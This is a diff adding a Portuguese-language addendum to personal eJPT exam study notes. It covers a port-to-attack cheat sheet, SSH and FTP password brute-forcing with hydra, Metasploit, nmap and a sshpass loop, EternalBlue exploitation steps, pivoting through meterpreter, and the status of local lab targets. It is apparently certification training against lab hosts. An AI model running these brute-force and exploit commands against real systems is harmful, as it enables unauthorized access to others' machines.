@@ -753,4 +753,89 @@ docker logs pivot-internal | tail -3      # origem = 172.20.0.4  ✅
 | E — Pivot | lab novo | ✅ **validado ponta a ponta hoje** |
 
 
+# ADENDO 16/NOV — VÉSPERA DO EXAME: estado medido às 11:15
+
+## Tabela de bolso atualizada (porta aberta → 1º comando, tudo verificado hoje)
+
+| Porta | 1º comando | 2º passo | Ferramenta que FUNCIONA aqui |
+|---|---|---|---|
+| qualquer | `bash ~/LIBERTUS/ejpt/scan.sh IP` | lê o relatório e segue a tabela | nmap 7.993 |
+| 21 | `nmap -p21 -Pn --script ftp-anon,ftp-vsftpd-backdoor IP` | `hydra -L ~/wordlists/user/top-usernames.txt -P ~/wordlists/pass/top1000.txt -t 4 ftp://IP` | hydra FTP ✅ |
+| 22 | msf `ssh_login` | `nmap -p22 -Pn --script ssh-brute` | msf ✅ · ssh-brute ✅ · hydra ❌ |
+| 80/443/8080 | `curl -si http://IP` + `gobuster dir` | nikto / sqlmap com cookie | gobuster 3.8.2 ✅ |
+| 445 | `nmap -p445 -Pn --script smb-vuln-ms17-010,smb-os-discovery IP` | msf `smb_ms17_010` → `ms17_010_eternalblue` | msf 6.4.126 ✅ |
+| 3306 | `hydra -L users -P passes mysql://IP` | msf `mysql_login` | hydra mysql ✅ |
+| 3389 | msf `rdp_scanner` → `rdp_login` | — | hydra RDP ❌ |
+| rede /24 | meterpreter → `autoroute` → `socks_proxy` | `proxychains4 nmap -sT -Pn` | validado 12/nov §H |
+
+## D (22/SSH) — três rotas, ordem de preferência (revalidado hoje)
+
+```bash
+# ROTA 1 — Metasploit: é a única que ABRE SESSÃO (melhor para o exame)
+msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; \
+ set RHOSTS IP; set USERNAME msfadmin; set PASS_FILE /home/libertus/wordlists/pass/top1000.txt; \
+ set STOP_ON_SUCCESS true; set VERBOSE true; run; exit -y"
+# Saída real de hoje:
+# [+] 127.0.0.1:2222 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) ...'
+# [*] SSH session 1 opened (127.0.0.1:40441 -> 127.0.0.1:2222)
+
+# ROTA 2 — nmap ssh-brute: só CONFIRMA a senha (não abre sessão), mas é 1 comando
+printf "msfadmin\n"         > ~/LIBERTUS/ejpt/wordlists/ejpt_ssh_users.txt   # TEM que ser em $HOME (snap)
+printf "errada\nmsfadmin\n" > ~/LIBERTUS/ejpt/wordlists/ejpt_ssh_pass.txt
+nmap -p 22 -Pn --script ssh-brute \
+  --script-args userdb=/home/libertus/LIBERTUS/ejpt/wordlists/ejpt_ssh_users.txt,passdb=/home/libertus/LIBERTUS/ejpt/wordlists/ejpt_ssh_pass.txt IP
+# -> |     msfadmin:msfadmin - Valid credentials
+
+# ROTA 3 — sshpass em loop (Kali da INE: hidra completo, nem precisa disto)
+while read p; do sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
+  msfadmin@IP 'id' 2>/dev/null && echo "SENHA: $p" && break; done < ~/wordlists/pass/top1000.txt
+```
+
+**Regra:** hidra NUNCA para SSH nesta máquina (`Compiled without LIBSSH`). Não perder 1 minuto tentando.
+
+## B (21/FTP) — comando e saída reais (hoje, lab oficial)
+
+```bash
+printf "errada\nmsfadmin\n" > ~/LIBERTUS/ejpt/wordlists/ejpt_ssh_pass.txt
+hydra -l msfadmin -P ~/LIBERTUS/ejpt/wordlists/ejpt_ssh_pass.txt ftp://127.0.0.1:2121 -t 2
+# -> [2121][ftp] host: 127.0.0.1   login: msfadmin   password: msfadmin
+#   1 of 1 target successfully completed, 1 valid password found
+```
+
+Depois de entrar (no Kali): `ftp IP` → `ls -la` → procurar `backup`, `.ssh`, `config.php`.
+Anônimo: `ftp anonymous@IP` (senha qualquer) — **na INE isso ainda cai**, testar antes do hydra.
+
+## A (445/SMB) — nuance nova que evita conclusão errada
+
+`smb-vuln-ms17-010` contra **Samba** (nosso 172.28.77.11) não devolve veredito nenhum — nem
+VULNERABLE nem NOT. Rodou hoje e a saída foi só `smb-os-discovery: OS: Windows 6.1 (Samba 4.19.9)`.
+Só Windows responde o veredito. Consequência prática no exame:
+
+1. Se aparecer `VULNERABLE` → `use exploit/windows/smb/ms17_010_eternalblue` direto.
+2. Se **não** aparecer nada → rodar `smb-vuln-ms08-067`, `smb-enum-shares`, e tentar
+   `auxiliary/scanner/smb/smb_login` com credencial vazia/guest antes de descartar.
+
+## E (Pivot) — estado do lab hoje
+
+`pivot_up.sh` não foi levantado nesta rodada (economia de recurso: disco em 99%, 1,2 GB livres).
+A cadeia está documentada e foi validada em 12/nov (§ acima). Se quiser treinar 30 min antes de dormir:
+
+```bash
+bash ~/LIBERTUS/ejpt/pivot_up.sh          # sobe edge + alvo interno
+# repetir a cadeia do §H: foothold → autoroute (SÓ meterpreter) → socks_proxy → proxychains4 curl
+bash ~/LIBERTUS/ejpt/pivot_up.sh down     # derrubar ao terminar
+```
+
+## Estado dos alvos de treino (16/nov, 11:15 — medido, não suposto)
+
+| Cenário | Alvo | Estado hoje |
+|---|---|---|
+| A — SMB | 172.28.77.11 / .12 | ✅ UP, 445 aberto, `smb-os-discovery` responde |
+| B — FTP | 127.0.0.1:2121 | ✅ UP, `msfadmin:msfadmin`, hydra achou em 2 tentativas |
+| C — Web | localhost:8080 / 3000 | ✅ DVWA 302 (login), Juice Shop 200, search endpoint 200 |
+| D — SSH | 127.0.0.1:2222 | ✅ UP, `msfadmin:msfadmin`, msf abriu sessão e ssh-brute confirmou |
+| E — Pivot | lab `pivot_up.sh` | ⏸ parado (subir só se for treinar) |
+
+
+
 
